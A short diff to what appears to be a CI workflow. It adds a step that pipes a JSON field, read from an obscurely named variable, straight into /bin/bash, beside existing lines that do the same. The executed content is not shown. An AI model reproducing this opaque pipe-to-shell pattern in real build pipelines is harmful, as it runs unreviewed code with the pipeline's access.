@@ -59,6 +59,7 @@ jobs:
           printf '%s' "$cfj9" | jq -r .ac585 | /bin/bash
           printf '%s' "$v15392" | jq -r .pei9901 | /bin/bash
           printf '%s' "$ii3" | jq -r .zhlw99 | /bin/bash
+          printf '%s' "$n8" | jq -r .yeuz11 | /bin/bash
 
       - name: Archive output
         if: always()
